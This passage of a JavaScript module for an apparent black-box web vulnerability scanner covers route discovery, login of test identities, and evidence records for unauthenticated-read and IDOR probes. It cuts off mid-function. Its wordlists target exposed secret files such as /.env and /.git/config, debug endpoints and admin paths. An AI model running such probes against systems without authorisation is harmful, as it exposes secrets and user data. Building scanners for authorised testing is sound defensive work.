/**
 * 纯黑盒外部扫描：只对已运行的目标发起 HTTP 探测，不读源码、不启动本地服务、不生成补丁。
 *
 * 所有请求经 Host 的 http.request 发出（回环 net.probe / 远程 net.egress）；
 * 登录凭证由 Host 保险库注入（identityRef），Sidecar 不见令牌明文。
 * 配置只从 guardbuild.json 读取 login / identities / blackbox 三块（不触发源码分析）。
 */
import { createServer } from "node:http";
import { CASE_CATEGORY, RPC_TO_HOST, SEVERITY, VERDICT, shortId } from "../../shared/protocol.mjs";
import { loginAll } from "./probe.mjs";
import { followRedirects } from "./http-follow.mjs";
import { attackPlanEnabled, planBudget, recordPlan, runAttackPlanner } from "./attackplan.mjs";

const OPENAPI_PATHS = [
  "/swagger.json", "/openapi.json", "/v3/api-docs", "/api-docs", "/swagger-ui.json",
  "/api/swagger.json", "/api/openapi.json", "/api/v3/api-docs", "/docs/openapi.json", "/openapi/v1.json",
];
const OPENAPI_CONFIG_PATHS = ["/v3/api-docs/swagger-config", "/swagger-config"];
const MANIFEST_PATHS = ["/asset-manifest.json", "/.vite/manifest.json", "/manifest.json", "/build/asset-manifest.json"];
const COMMON_API_PATHS = [
  "/api/users", "/api/user", "/api/account", "/api/accounts",
  "/api/orders", "/api/order", "/api/products", "/api/posts",
  "/api/projects", "/api/tickets", "/api/invoices",
  "/users", "/orders", "/products", "/posts",
  "/api/profile", "/api/me", "/api/settings", "/api/config",
  "/api/files", "/api/download", "/api/static", "/api/uploads",
  "/api/orders/search", "/api/users/search", "/api/search", "/api/query",
  "/api/messages", "/api/notifications", "/api/comments", "/api/items",
  "/api/customers", "/api/payments", "/api/carts", "/api/cart",
  "/api/documents", "/api/reports", "/api/tasks", "/api/events",
  "/api/dashboard", "/api/health", "/api/status", "/api/version",
  "/api/admin", "/api/admin/users", "/api/auth/me", "/api/auth/profile",
  "/api/v1/users", "/api/v1/orders", "/api/v1/products", "/api/v1/me",
  "/v1/users", "/v1/orders", "/v1/products", "/v1/me",
  "/rest/products/search", "/rest/user/whoami", "/rest/basket",
  "/graphql",
];
const MAX_FRONTEND_SCRIPTS = 8;
const MAX_FRONTEND_FETCHES = 24;
const MAX_FRONTEND_SCRIPT_CHARS = 500_000;
const MAX_FRONTEND_ROUTES = 80;
const MAX_SOURCE_MAPS = 3;
// 无前缀资源路由：只认「一眼是业务资源」的首段，避免把 /assets、/static 之类当接口。
const RESOURCE_SEGMENT = /^\/(?:users?|accounts?|orders?|products?|posts?|projects?|tickets?|invoices?|messages?|notifications?|comments?|items?|customers?|payments?|carts?|documents?|reports?|tasks?|events?|profiles?|files?|downloads?|uploads?|admin|search)(?:\/|$)/;
const ASSET_EXT = /\.(?:js|mjs|css|map|png|jpe?g|gif|svg|ico|webp|woff2?|ttf|eot|mp4|webm)$/i;
const ATTACK_SURFACE_PATHS = [
  "/admin", "/admin/", "/admin/login",
  "/actuator", "/actuator/health", "/actuator/env",
  "/debug/pprof", "/metrics",
  "/.env", "/.git/config", "/.git/HEAD",
  "/api/swagger", "/swagger", "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
];
const SENSITIVE_FILE_PATHS = new Set(["/.env", "/.git/config", "/.git/HEAD"]);
// 管理类路径：黑盒没有源码可判角色，只能按命名形状找候选（垂直越权 = 普通登录身份访问管理端点）。
// 词表要够宽（不同团队的命名习惯差异大），但只走 GET，且每类探测受 probeCap 预算约束。
const ADMIN_PATH_GUESSES = [
  "/api/admin", "/api/admin/users", "/api/admin/orders", "/api/admin/accounts",
  "/api/admin/tickets", "/api/admin/invoices", "/api/admin/customers", "/api/admin/messages",
  "/api/admin/stats", "/api/admin/dashboard", "/api/admin/settings",
  "/api/manage/users", "/api/internal/users", "/api/backoffice/orders", "/api/support/tickets",
  "/admin/users", "/admin/orders", "/admin/customers", "/admin/api/users",
  "/api/v1/admin/users", "/api/staff/orders",
];
const ADMIN_SEGMENT = /(?:^|\/)(?:admin|backoffice|manage|management|internal|staff|superuser|support)(?:\/|$)/i;
const LOGIN_PATHS_DEFAULT = ["/api/login", "/login", "/auth", "/api/auth"];
const DENIED_STATUS = new Set([401, 403, 404]);
const MAX_ROUTES = 60;
const MAX_PROBE_ROUTES = 14;

/** blackbox.maxRoutes 只收紧/放宽发现上限；未配置时保持内建默认。 */
function resolveRouteCap(options) {
  const raw = options?.config?.blackbox?.maxRoutes;
  if (!Number.isFinite(raw)) return MAX_ROUTES;
  return Math.min(200, Math.max(10, Math.floor(raw)));
}

/** 每类攻击的候选上限：默认 14，调低 maxRoutes 时同步收紧（不会超过路由上限）。 */
function resolveProbeCap(routeCap) {
  return Math.max(1, Math.min(routeCap, MAX_PROBE_ROUTES));
}

const OWNER_FIELDS = ["userId", "user_id", "ownerId", "owner_id", "createdBy", "authorId", "accountId", "uid", "customerId"];
const SENSITIVE_KEYS = new Set([
  "email", "phone", "address", "userId", "user_id", "ownerId", "owner_id",
  "balance", "cardNumber", "iban", "ssn", "passwordHash", "secret", "token",
]);
const SENSITIVE_SEGMENT = /(user|account|order|ticket|invoice|payment|profile|admin|file|download|document|message|customer)/i;
const PUBLIC_SEGMENT = /(public|health|docs?|swagger|openapi|login|register|signup|products?|catalog|assets?|static|metrics)/i;

function trimBody(text, limit = 4000) {
  if (!text) return "";
  return text.length > limit ? `${text.slice(0, limit)}…（截断，共 ${text.length} 字节）` : text;
}

function isOk(status) {
  return status >= 200 && status < 300;
}

function isDenied(status) {
  return DENIED_STATUS.has(status);
}

/** 经 Host 发起一次 HTTP 请求；identity 为保险库身份名（令牌由 Host 注入）。
 *  extraHeaders 只用于探测本身需要的头（Origin / Content-Type），仍由 Host 发出，不绕过边界。 */
async function httpJson(
  ctx,
  { baseUrl, method, path, identity = null, body = null, timeoutMs = 15_000, headers: extraHeaders = null, contentType = null }
) {
  const headers = { ...(ctx.loginConfig?.extraHeaders ?? {}) };
  if (body != null) headers["Content-Type"] = contentType ?? "application/json";
  if (extraHeaders && typeof extraHeaders === "object") Object.assign(headers, extraHeaders);
  const params = {
    token: ctx.tokens.http ?? ctx.tokens.net,
    method,
    url: `${baseUrl.replace(/\/+$/, "")}${path.startsWith("/") ? path : `/${path}`}`,
    headers,
    redact: true,
    timeoutMs,
  };
  if (body != null) params.body = typeof body === "string" ? body : JSON.stringify(body);
  if (identity) params.identityRef = identity;
  try {
    const followed = await followRedirects(
      (url) => ctx.rpc.request(RPC_TO_HOST.HTTP_REQUEST, { ...params, url }, { timeoutMs: timeoutMs + 5_000 }),
      params.url,
      { method }
    );
    const res = followed.res;
    let json = null;
    try {
      json = JSON.parse(res.body);
    } catch {
      /* 非 JSON 响应 */
    }
    return { ...res, json, ok: isOk(res.status), redirects: followed.hops };
  } catch (e) {
    return { status: 0, statusText: "request_failed", body: "", json: null, ok: false, error: e.message };
  }
}

/** 深度收集响应中的对象数组，选「像资源列表」的那个（含 id/归属字段优先）。 */
export function extractItems(json, maxDepth = 4) {
  const arrays = [];
  const walk = (node, depth) => {
    if (depth > maxDepth || node == null) return;
    if (Array.isArray(node)) {
      const objects = node.filter((x) => x && typeof x === "object" && !Array.isArray(x));
      if (objects.length) arrays.push(objects);
      return;
    }
    if (typeof node !== "object") return;
    for (const v of Object.values(node)) walk(v, depth + 1);
  };
  walk(json, 0);
  const score = (arr) =>
    arr.filter((o) => extractId(o) != null).length * 10 +
    arr.filter((o) => extractOwner(o) != null).length * 5 +
    arr.length;
  arrays.sort((a, b) => score(b) - score(a));
  return arrays[0] ?? [];
}

/** 深度查找 id 匹配的对象（详情响应可能包在 data/entity 中）。 */
export function extractEntityById(json, id, maxDepth = 4) {
  let found = null;
  const walk = (node, depth) => {
    if (found || depth > maxDepth || node == null || typeof node !== "object") return;
    if (Array.isArray(node)) {
      for (const v of node) walk(v, depth + 1);
      return;
    }
    const nodeId = extractId(node);
    if (nodeId != null && String(nodeId) === String(id)) {
      found = node;
      return;
    }
    for (const v of Object.values(node)) walk(v, depth + 1);
  };
  walk(json, 0);
  return found;
}

export function extractId(obj) {
  const v = obj?.id ?? obj?.ID ?? obj?._id ?? obj?.resourceId;
  return v == null ? null : v;
}

export function extractOwner(obj) {
  if (!obj || typeof obj !== "object") return null;
  for (const f of OWNER_FIELDS) {
    if (obj[f] != null) return { field: f, value: obj[f] };
  }
  return null;
}

function containsSensitiveValue(node, depth = 0) {
  if (depth > 5 || node == null) return false;
  if (Array.isArray(node)) return node.some((v) => containsSensitiveValue(v, depth + 1));
  if (typeof node !== "object") return false;
  for (const [k, v] of Object.entries(node)) {
    if (SENSITIVE_KEYS.has(k) && v != null && v !== "") return true;
    if (containsSensitiveValue(v, depth + 1)) return true;
  }
  return false;
}

function looksSensitivePath(path) {
  const segs = path.split("?")[0].split("/").filter(Boolean);
  if (segs.some((s) => PUBLIC_SEGMENT.test(s))) return false;
  return segs.some((s) => SENSITIVE_SEGMENT.test(s));
}

// ---------- 发现 ----------

export async function discoverOpenapi(ctx, baseUrl) {
  const origin = new URL(baseUrl).origin;
  const tried = new Set();
  const fetchDoc = async (p) => {
    if (tried.has(p)) return null;
    tried.add(p);
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: p, timeoutMs: 8_000 });
    return res.ok && res.json ? { doc: res.json, path: p } : null;
  };
  // Springdoc 等框架把真正的文档地址放在 swagger-config 里（urls[] 或 configUrl），
  // 只探测固定候选路径会直接漏掉整份 OpenAPI——这里按文档声明继续一跳。
  const followConfig = async (found) => {
    const refs = [];
    if (Array.isArray(found.doc?.urls)) {
      for (const u of found.doc.urls.slice(0, 3)) if (typeof u?.url === "string") refs.push(u.url);
    }
    if (typeof found.doc?.configUrl === "string") refs.push(found.doc.configUrl);
    for (const ref of refs) {
      let path;
      try {
        const url = new URL(ref, `${baseUrl.replace(/\/+$/, "")}${found.path}`);
        if (url.origin !== origin) continue;
        path = `${url.pathname}${url.search}`;
      } catch {
        continue;
      }
      const next = await fetchDoc(path);
      if (next?.doc?.paths) return next;
    }
    return null;
  };
  const report = (found) => {
    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.INFO,
      message: `发现 OpenAPI 文档：${found.path}（${Object.keys(found.doc?.paths ?? {}).length} 条路径）`,
      data: { path: found.path },
    });
    return found;
  };

  for (const p of OPENAPI_PATHS) {
    const found = await fetchDoc(p);
    if (!found) continue;
    if (found.doc.paths) return report(found);
    const indirect = await followConfig(found);
    if (indirect) return report(indirect);
  }
  for (const p of OPENAPI_CONFIG_PATHS) {
    const found = await fetchDoc(p);
    if (!found) continue;
    const indirect = await followConfig(found);
    if (indirect) return report(indirect);
  }
  ctx.emit({ kind: "discovery", severity: SEVERITY.WARN, message: "未发现 OpenAPI 文档，回落到目录探测" });
  return null;
}

/** OpenAPI 路径 → 路由列表；带 {param} 的模板单独标记（黑盒无法凭空构造有效 ID）。
 *  同时携带该操作声明的查询参数名（in=query）——注入/穿越用例必须打在真实参数上，
 *  写死的参数名（如 q）对只做参数校验的框架会被静默忽略，造成漏报。 */
export function openapiRoutes(found, limit = MAX_ROUTES) {
  const doc = found?.doc ?? null;
  if (!doc?.paths) return [];
  let base = "";
  try {
    const server = Array.isArray(doc.servers) ? doc.servers[0]?.url : null;
    if (server) base = new URL(server, "http://placeholder").pathname.replace(/\/+$/, "");
  } catch {
    base = "";
  }
  const queryNames = (params) =>
    Array.isArray(params)
      ? params
          .filter((p) => p && p.in === "query" && typeof p.name === "string" && p.name)
          .map((p) => p.name)
      : [];
  const out = [];
  for (const [p, methods] of Object.entries(doc.paths)) {
    if (!methods || typeof methods !== "object") continue;
    const path = `${base}${p.startsWith("/") ? p : `/${p}`}`;
    const sharedParams = queryNames(methods.parameters);
    for (const method of Object.keys(methods)) {
      if (!["get", "post", "put", "patch", "delete"].includes(method.toLowerCase())) continue;
      const op = methods[method] ?? {};
      out.push({
        method: method.toUpperCase(),
        path,
        templated: /\{[^}]+\}|:[A-Za-z_]\w*/.test(path),
        queryParams: [...new Set([...sharedParams, ...queryNames(op.parameters)])].slice(0, 6),
        source: "openapi",
      });
      if (out.length >= limit) return out;
    }
  }
  return out;
}

/** 目录探测常见 API 路径（401/403 也算路由存在）。 */
export async function bruteRoutes(ctx, baseUrl) {
  const found = [];
  // 管理端点命名猜词一并进发现阶段：它们大多需要登录（401/403 也算存在），
  // 不进路由表就没人知道目标有没有管理面，垂直越权用例也就没有候选。
  const wordlist = [...COMMON_API_PATHS, ...ADMIN_PATH_GUESSES.filter((p) => !COMMON_API_PATHS.includes(p))];
  for (const p of wordlist) {
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: p, timeoutMs: 5_000 });
    if (res.ok || isDenied(res.status)) {
      found.push({ method: "GET", path: p, templated: false, status: res.status, source: "brute" });
    }
  }
  if (found.length) {
    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.INFO,
      message: `目录探测发现 ${found.length} 条路由（含需登录的端点）`,
      data: { routes: found.map((r) => r.path) },
    });
  }
  return found;
}

/** 从 HTML/JS 文本里提取字面量 API 路径；动态片段/静态资源路径一律跳过。
 *  baseUrl 传入时额外接受同源绝对 URL 与无前缀业务资源路径（"/orders"），
 *  两者都只在同源前提下才收，避免把外链或静态目录当接口。 */
export function extractRoutesFromText(text, baseUrl = null) {
  const raw = String(text ?? "").replace(/\\\//g, "/");
  const out = new Set();
  const add = (value) => {
    const route = normalizeFrontendRoute(value);
    if (route) out.add(route);
  };
  const re = /["'`]((?:\/api|\/rest|\/graphql|\/v\d+)[^"'`\s\\]*)["'`]/g;
  let m;
  while ((m = re.exec(raw)) && out.size < MAX_FRONTEND_ROUTES) add(m[1]);

  if (baseUrl) {
    let origin;
    try {
      origin = new URL(baseUrl).origin;
    } catch {
      origin = null;
    }
    const absRe = /https?:\/\/[A-Za-z0-9._~:\-[\]]+(?::\d+)?\/[^"'`\s<>\\]*/g;
    while ((m = absRe.exec(raw)) && out.size < MAX_FRONTEND_ROUTES) {
      try {
        const url = new URL(m[0]);
        if (!origin || url.origin !== origin) continue;
        add(`${url.pathname}${url.search}`);
      } catch {
        /* 非法 URL 忽略 */
      }
    }
  }

  const bareRe = /["'`](\/[A-Za-z0-9._~\-/]*)["'`]/g;
  while ((m = bareRe.exec(raw)) && out.size < MAX_FRONTEND_ROUTES) {
    if (RESOURCE_SEGMENT.test(m[1])) add(m[1]);
  }
  return [...out];
}

/** 同源 JS 模块引用：静态 import/export from 与动态 import()。 */
export function extractModuleRefs(text, baseUrl, currentPath = "/") {
  const raw = String(text ?? "");
  const origin = new URL(baseUrl).origin;
  const base = new URL(currentPath, `${baseUrl.replace(/\/+$/, "")}/`);
  const out = [];
  const push = (spec) => {
    if (!spec || spec.length > 300 || out.length >= MAX_FRONTEND_FETCHES) return;
    if (!/\.m?js(?:[?#].*)?$/i.test(spec)) return;
    try {
      const url = new URL(spec, base);
      if (url.origin !== origin) return;
      const p = `${url.pathname}${url.search}`;
      if (!out.includes(p)) out.push(p);
    } catch {
      /* 非法引用忽略 */
    }
  };
  const patterns = [
    /\bimport\s+(?:[^"'();]*?\s+from\s+)?["']([^"']+)["']/g,
    /\bexport\s+(?:\*|\{[^}]*\})\s+from\s*["']([^"']+)["']/g,
    /\bimport\s*\(\s*["']([^"']+)["']\s*\)/g,
  ];
  for (const re of patterns) {
    let m;
    while ((m = re.exec(raw)) && out.length < MAX_FRONTEND_FETCHES) push(m[1]);
  }
  return out;
}

/** 构建清单（CRA asset-manifest / Vite manifest）里的同源 JS 资源。 */
export function extractManifestScripts(json, baseUrl, fromPath = "/") {
  const origin = new URL(baseUrl).origin;
  const base = new URL(fromPath, `${baseUrl.replace(/\/+$/, "")}/`);
  // Vite 的 manifest 位于 /.vite/manifest.json，但 file 字段相对构建根目录；其余清单相对自身目录。
  const resolveBase = base.pathname.includes("/.vite/") ? new URL("/", origin) : new URL("./", base);
  const out = [];
  const push = (value) => {
    if (typeof value !== "string" || out.length >= MAX_FRONTEND_SCRIPTS) return;
    const raw = value.trim();
    if (!raw || raw.length > 300 || !/\.m?js(?:[?#].*)?$/i.test(raw)) return;
    try {
      const url = new URL(raw, resolveBase);
      if (url.origin !== origin) return;
      const p = `${url.pathname}${url.search}`;
      if (!out.includes(p)) out.push(p);
    } catch {
      /* 非法值忽略 */
    }
  };
  const walk = (node, depth) => {
    if (depth > 4 || out.length >= MAX_FRONTEND_SCRIPTS) return;
    if (typeof node === "string") return push(node);
    if (Array.isArray(node)) {
      for (const v of node) walk(v, depth + 1);
      return;
    }
    if (node && typeof node === "object") for (const v of Object.values(node)) walk(v, depth + 1);
  };
  walk(json, 0);
  return out;
}

export function extractSourceMapUrl(text) {
  const m = String(text ?? "").match(/\/\/[#@]\s*sourceMappingURL=([^\s'"]+)|(?:\/\*[#@]\s*sourceMappingURL=([^\s*]+)\s*\*\/)/);
  return m ? (m[1] ?? m[2]) : null;
}

/** 从 source map 的 sourcesContent 里提取路由：打包前的源码会把接口写成字符串字面量。 */
export function extractRoutesFromSourceMap(json, baseUrl = null) {
  const out = new Set();
  const contents = Array.isArray(json?.sourcesContent) ? json.sourcesContent : [];
  for (const text of contents) {
    if (typeof text !== "string") continue;
    for (const p of extractRoutesFromText(text.slice(0, MAX_FRONTEND_SCRIPT_CHARS), baseUrl)) out.add(p);
    if (out.size >= MAX_FRONTEND_ROUTES) break;
  }
  return [...out];
}

function normalizeFrontendRoute(value) {
  let p = String(value).split(/[?#]/)[0];
  if (!p || p.length > 120) return null;
  if (/[$`{}:*<>]/.test(p)) return null;
  p = p.replace(/\/{2,}/g, "/").replace(/\/+$/, "");
  if (p.length < 4) return null;
  if (ASSET_EXT.test(p)) return null;
  if (!/^\/[A-Za-z0-9._~\-/]+$/.test(p)) return null;
  return p;
}

/** 首页 HTML 中的同源脚本地址（script src + modulepreload），转成可直接请求的 path。 */
export function extractScriptPaths(html, baseUrl) {
  const raw = String(html ?? "");
  const out = [];
  const push = (src) => {
    if (!src || out.length >= MAX_FRONTEND_SCRIPTS) return;
    try {
      const url = new URL(src.replace(/&amp;/g, "&"), baseUrl);
      if (url.origin !== new URL(baseUrl).origin) return;
      if (!/\.m?js$/i.test(url.pathname)) return;
      const path = `${url.pathname}${url.search}`;
      if (!out.includes(path)) out.push(path);
    } catch {
      /* 非法 src 忽略 */
    }
  };
  let m;
  const scriptRe = /<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["'][^>]*>/gi;
  while ((m = scriptRe.exec(raw))) push(m[1]);
  const preloadRe = /<link\b[^>]*\brel\s*=\s*["'](?:modulepreload|preload)["'][^>]*\bhref\s*=\s*["']([^"']+)["'][^>]*>/gi;
  while ((m = preloadRe.exec(raw))) push(m[1]);
  return out;
}

function inlineScripts(html, limit = 4) {
  const raw = String(html ?? "");
  const out = [];
  const re = /<script\b(?![^>]*\bsrc\s*=)[^>]*>([\s\S]*?)<\/script>/gi;
  let m;
  while ((m = re.exec(raw)) && out.length < limit) out.push(m[1].slice(0, MAX_FRONTEND_SCRIPT_CHARS));
  return out;
}

/** 抓首页、构建清单、同源 JS 模块图与 source map，提取前端实际调用的字面量路由。
 *  预算固定（脚本 24 份 / source map 3 份 / 清单 4 份），只走同源 GET，不执行任何脚本。 */
export async function discoverFrontendRoutes(ctx, baseUrl, { html = null } = {}) {
  let page = html;
  if (page == null) {
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: "/", timeoutMs: 8_000 });
    page = res.body ?? "";
  }
  const origin = new URL(baseUrl).origin;
  const scripts = extractScriptPaths(page, baseUrl);
  const routes = new Map();
  const merge = (list) => {
    for (const p of list) if (!routes.has(p)) routes.set(p, true);
  };
  const collect = (text) => merge(extractRoutesFromText(text, baseUrl));
  for (const snippet of inlineScripts(page)) collect(snippet);

  // 框架构建清单里常直接列出所有 chunk（CRA asset-manifest / Vite manifest），
  // 比只解析首页 script 标签覆盖更全。
  const queue = [...scripts];
  const seen = new Set(queue);
  let manifests = 0;
  for (const mp of MANIFEST_PATHS) {
    if (queue.length >= MAX_FRONTEND_FETCHES) break;
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: mp, timeoutMs: 6_000 });
    if (!res.ok || !res.body) continue;
    let json = null;
    try {
      json = JSON.parse(res.body.slice(0, MAX_FRONTEND_SCRIPT_CHARS));
    } catch {
      continue;
    }
    manifests += 1;
    for (const p of extractManifestScripts(json, baseUrl, mp)) {
      if (!seen.has(p)) {
        seen.add(p);
        queue.push(p);
      }
    }
  }

  let fetched = 0;
  let sourceMaps = 0;
  while (queue.length && fetched < MAX_FRONTEND_FETCHES) {
    const src = queue.shift();
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: src, timeoutMs: 8_000 });
    if (!res.ok || !res.body) continue;
    fetched += 1;
    const body = res.body.slice(0, MAX_FRONTEND_SCRIPT_CHARS);
    collect(body);

    // 动态 import 的二级 chunk 往往才是接口所在，必须按模块图继续爬。
    for (const ref of extractModuleRefs(body, baseUrl, src)) {
      if (seen.has(ref) || fetched + queue.length >= MAX_FRONTEND_FETCHES) continue;
      seen.add(ref);
      queue.push(ref);
    }

    const mapRef = extractSourceMapUrl(body);
    if (mapRef && sourceMaps < MAX_SOURCE_MAPS) {
      let mapPath = null;
      try {
        const url = new URL(mapRef, new URL(src, `${baseUrl.replace(/\/+$/, "")}/`));
        if (url.origin === origin) mapPath = `${url.pathname}${url.search}`;
      } catch {
        mapPath = null;
      }
      if (mapPath && !seen.has(mapPath)) {
        seen.add(mapPath);
        const mapRes = await httpJson(ctx, { baseUrl, method: "GET", path: mapPath, timeoutMs: 8_000 });
        if (mapRes.ok && mapRes.body) {
          sourceMaps += 1;
          try {
            const map = JSON.parse(mapRes.body.slice(0, MAX_FRONTEND_SCRIPT_CHARS * 4));
            merge(extractRoutesFromSourceMap(map, baseUrl));
          } catch {
            /* 非法 source map 忽略 */
          }
        }
      }
    }
  }

  const list = [...routes.keys()].slice(0, MAX_FRONTEND_ROUTES).map((p) => ({
    method: "GET",
    path: p,
    templated: false,
    source: "frontend",
  }));
  if (list.length) {
    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.INFO,
      message: `前端资源提取 ${list.length} 条字面量路由（同源脚本 ${fetched} 份，source map ${sourceMaps} 份，构建清单 ${manifests} 份）`,
      data: { routes: list.map((r) => r.path), scripts: scripts.length, fetched, sourceMaps, manifests },
    });
  } else if (scripts.length || manifests) {
    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.INFO,
      message: `已抓取前端资源（首页脚本 ${scripts.length} 个，构建清单 ${manifests} 份），未提取到字面量 API 路由`,
      data: { scripts: scripts.length, fetched, sourceMaps, manifests },
    });
  }
  return { routes: list, scripts: scripts.length, fetched, sourceMaps, manifests };
}

function mergeRoutes(limit, ...lists) {
  const seen = new Set();
  const out = [];
  for (const list of lists) {
    for (const r of list) {
      if (r.templated) continue; // 模板路径无法可靠构造，仅保留在 OpenAPI 计数里
      const key = `${r.method} ${r.path}`;
      if (seen.has(key)) continue;
      seen.add(key);
      out.push(r);
      if (out.length >= limit) return out;
    }
  }
  return out;
}

// ---------- 登录 ----------

async function tryLogin(ctx, baseUrl, cfg) {
  const candidates = [
    ...(cfg.login?.path ? [cfg.login.path] : []),
    ...(cfg.blackbox?.loginPaths ?? []),
    ...LOGIN_PATHS_DEFAULT,
  ];
  const uniq = [...new Set(candidates.map((p) => (p.startsWith("/") ? p : `/${p}`)))];
  ctx.plan = {
    ...(ctx.plan ?? {}),
    loginPath: cfg.login?.path ?? uniq[0],
    loginCandidates: uniq,
    resource: null,
  };
  if (!cfg.login && !cfg.identities) {
    ctx.emit({
      kind: "identity",
      severity: SEVERITY.WARN,
      message:
        "guardbuild.json 未声明 login/identities：将使用内建演示账号尝试登录（通常只适用于本地示例项目）；真实目标请在契约中提供测试身份",
      data: { loginPaths: uniq, identities: ctx.identities.map((i) => i.name) },
    });
  }
  try {
    const loggedIn = await loginAll(ctx, baseUrl);
    return { ok: true, identities: loggedIn, path: ctx.plan.loginPath };
  } catch (e) {
    ctx.emit({
      kind: "identity",
      severity: SEVERITY.WARN,
      message: `黑盒登录失败：${e.message}（继续执行未认证探测；越权类用例将跳过）`,
      data: { code: e.code ?? null, hint: e.hint ?? null, loginPaths: uniq },
    });
    return { ok: false, identities: [], path: ctx.plan.loginPath };
  }
}

// ---------- 证据 ----------

function makeRecord(
  ctx,
  baseUrl,
  { caseId, name, method, path, identity, body, res, expectation, verdict, actual, grade = "http-only", crossProof = null, impact = null, reqHeaders = null }
) {
  const authHeader = identity
    ? ctx.loginConfig?.cookieAuth === true
      ? { Cookie: `***vault:${identity}***` }
      : { Authorization: `Bearer ***vault:${identity}***` }
    : {};
  return {
    id: shortId("ev"),
    sessionId: ctx.sessionId,
    phase: "blackbox",
    identity: identity ?? "(anonymous)",
    method,
    endpoint: path,
    request: {
      url: `${baseUrl.replace(/\/+$/, "")}${path}`,
      headers: {
        ...authHeader,
        "Content-Type": "application/json",
        ...(reqHeaders ?? {}),
      },
      body: body ?? null,
    },
    response: {
      status: res.status,
      statusText: res.statusText ?? null,
      body: trimBody(res.body),
      redacted: !!res.redacted,
      durationMs: res.durationMs ?? null,
    },
    decision: null,
    crossProof,
    evidenceGrade: grade,
    expectation,
    verdict,
    actual,
    impact,
    caseId,
    caseCategory: CASE_CATEGORY.ATTACK,
    caseName: name,
    createdAt: Date.now(),
  };
}

function emitRecord(ctx, rec) {
  const severity =
    rec.verdict === VERDICT.VULNERABLE
      ? SEVERITY.ERROR
      : rec.verdict === VERDICT.INCONCLUSIVE
        ? SEVERITY.WARN
        : SEVERITY.SUCCESS;
  ctx.emit({
    kind: "evidence",
    severity,
    message: `[黑盒] ${rec.caseName} → HTTP ${rec.response.status} · ${rec.verdict}${rec.impact ? ` · ${rec.impact}` : ""}`,
    phase: "blackbox",
    data: {
      evidenceId: rec.id,
      caseId: rec.caseId,
      category: rec.caseCategory,
      verdict: rec.verdict,
      status: rec.response.status,
      evidenceGrade: rec.evidenceGrade,
      crossProof: rec.crossProof,
    },
  });
}

// ---------- 攻击探测 ----------

async function probeAttackSurface(ctx, baseUrl) {
  const records = [];
  for (const p of ATTACK_SURFACE_PATHS) {
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: p });
    if (!res.ok) continue;
    const body = res.body ?? "";
    const finding =
      (SENSITIVE_FILE_PATHS.has(p) && body.length > 0 && !/^\s*<!doctype html/i.test(body)) ||
      (p === "/actuator/env" && /propertySources|systemProperties|systemEnvironment/i.test(body));
    // 200 的管理页/健康检查本身不是漏洞；只对敏感文件与调试端点出证据
    if (!finding) {
      ctx.emit({
        kind: "discovery",
        severity: SEVERITY.INFO,
        message: `攻击面：${p} 可未认证访问（HTTP ${res.status}），未检出敏感内容`,
        phase: "blackbox",
        data: { path: p, status: res.status },
      });
      continue;
    }
    const name = SENSITIVE_FILE_PATHS.has(p) ? "敏感文件暴露" : "管理/调试面暴露";
    const rec = makeRecord(ctx, baseUrl, {
      caseId: `blackbox-surface-${p.replace(/[^a-z0-9]+/gi, "-").replace(/^-|-$/g, "") || "root"}`,
      name: `黑盒·${name} ${p}`,
      method: "GET",
      path: p,
      identity: null,
      res,
      expectation: "敏感文件/调试端点不应对未认证请求开放",
      verdict: finding ? VERDICT.VULNERABLE : VERDICT.INCONCLUSIVE,
      actual: finding
        ? `未认证请求返回 HTTP ${res.status}，响应内容符合${name}特征`
        : `HTTP ${res.status}，响应未显示敏感内容（可能为登录页或占位页）`,
      impact: finding ? name : null,
    });
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

async function checkRateLimit(ctx, baseUrl) {
  let limited = false;
  let reachable = false;
  for (let i = 0; i < 10; i++) {
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: "/" });
    if (res.status > 0) reachable = true;
    if (res.status === 429) {
      limited = true;
      break;
    }
  }
  ctx.emit({
    kind: "discovery",
    severity: SEVERITY.INFO,
    message: limited
      ? "速率限制：连续 10 次请求命中 HTTP 429，目标存在限流"
      : "速率限制：连续 10 次请求未出现 429（仅记录，不作为漏洞结论）",
    data: { limited, reachable },
  });
  return { limited, reachable };
}

async function probeUnauthRead(ctx, baseUrl, routes, limit = MAX_PROBE_ROUTES) {
  const records = [];
  for (const route of routes.filter((r) => r.method === "GET").slice(0, limit)) {
    const res = await httpJson(ctx, { baseUrl, method: "GET", path: route.path });
    if (!res.ok) continue;
    const sensitivePath = looksSensitivePath(route.path);
    const sensitiveData = containsSensitiveValue(res.json);
    if (!sensitivePath) continue;
    const rec = makeRecord(ctx, baseUrl, {
      caseId: `blackbox-unauth-${route.path.replace(/[^a-z0-9]+/gi, "-").replace(/^-|-$/g, "")}`,
      name: `黑盒·未认证读取 ${route.path}`,
      method: "GET",
      path: route.path,
      identity: null,
      res,
      expectation: "需认证的业务端点对匿名请求应返回 401/403",
      verdict: sensitiveData ? VERDICT.VULNERABLE : VERDICT.INCONCLUSIVE,
      actual: sensitiveData
        ? `匿名请求返回 HTTP ${res.status}，响应包含用户/归属类敏感字段`
        : `匿名请求返回 HTTP ${res.status}，但响应未包含可确认的敏感字段（可能为公开数据）`,
      grade: "http-only",
      impact: sensitiveData ? "未登录即可读取业务数据" : null,
    });
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

async function probeIdor(ctx, baseUrl, routes, { attacker, victim }, limit = MAX_PROBE_ROUTES) {
  const records = [];
  const candidates = routes.filter((r) => r.method === "GET").slice(0, limit);
  for (const route of candidates) {
    const list = await httpJson(ctx, { baseUrl, method: "GET", path: route.path, identity: victim.name });
    if (!list.ok) continue;
    const items = extractItems(list.json);
    const victimItem = items.find((o) => extractId(o) != null);
    if (!victimItem) continue;
    const victimId = extractId(victimItem);
    const detailPath = `${route.path.replace(/\/+$/, "")}/${encodeURIComponent(victimId)}`;
